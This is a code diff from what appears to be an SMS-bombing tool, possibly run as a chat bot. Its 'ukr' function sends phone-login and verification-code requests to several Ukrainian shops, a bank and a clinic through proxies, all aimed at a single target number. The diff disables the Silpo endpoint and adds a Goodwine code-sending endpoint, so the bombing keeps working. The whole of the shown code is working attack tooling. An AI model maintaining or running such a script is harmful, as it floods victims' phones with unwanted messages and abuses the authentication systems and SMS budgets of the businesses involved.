@@ -23,7 +23,7 @@ from headers_main import (
     headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
     headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
     cookies_elmir_call, headers_apteka24, headers_ta_da, headers_monto, cookies_monto,
-    headers_smartmedical, cookies_smartmedical, headers_silpo
+    headers_smartmedical, cookies_smartmedical, headers_silpo, headers_goodwine
 )
 import asyncpg
 import config
@@ -1501,7 +1501,8 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
             # bounded_request("https://api.ta-da.net.ua/v1.1/mobile/user.auth", **with_proxy({"json": {"phone": formatted_number9}, "headers": headers_ta_da})),
             # bounded_request("https://mobilebanking.monto.com.ua/api-web/v1/authorization", **with_proxy({"json": {"form_id": "get_login", "login": number}, "headers": {**headers_monto, "device_id": monto_device_id, "fingerprint": monto_fingerprint}, "cookies": cookies_monto})),
             # bounded_request("https://smartmedicalcenter.ua/health/", **with_proxy({"data": {"auth_login": number[2:], "auth_password": "1234567890"}, "headers": headers_smartmedical, "cookies": cookies_smartmedical})),
-            bounded_request("https://auth.silpo.ua/api/v2/Login/ByPhone?returnUrl=/connect/authorize/callback?client_id=silpo--site--spa&redirect_uri=https%3A%2F%2Fsilpo.ua%2Fsignin-callback-angular.html&response_type=code&scope=public-my%20openid&nonce=62467d1da847556567d91332155e1a20f91fX8X6q&state=7a1776bee43ba28c3ab79191a4e54a4c55ll8naMu&code_challenge=V5cFVVx4xON-EYdzjheeqM2l1K5KUnQ4dDXJ5ROU58Y&code_challenge_method=S256", **with_proxy({"json": {"delivery_method": "sms", "phone": "+" + number, "phoneChannelType": 0, "recaptcha": None}, "headers": headers_silpo})),
+            # bounded_request("https://auth.silpo.ua/api/v2/Login/ByPhone?returnUrl=/connect/authorize/callback?client_id=silpo--site--spa&redirect_uri=https%3A%2F%2Fsilpo.ua%2Fsignin-callback-angular.html&response_type=code&scope=public-my%20openid&nonce=62467d1da847556567d91332155e1a20f91fX8X6q&state=7a1776bee43ba28c3ab79191a4e54a4c55ll8naMu&code_challenge=V5cFVVx4xON-EYdzjheeqM2l1K5KUnQ4dDXJ5ROU58Y&code_challenge_method=S256", **with_proxy({"json": {"delivery_method": "sms", "phone": "+" + number, "phoneChannelType": 0, "recaptcha": None}, "headers": headers_silpo})),
+            bounded_request("https://goodwine.com.ua/ua/auth/code/send", **with_proxy({"json": {"username": "+" + number}, "headers": headers_goodwine})),
         ]
 
     if not attack_flags.get(chat_id):
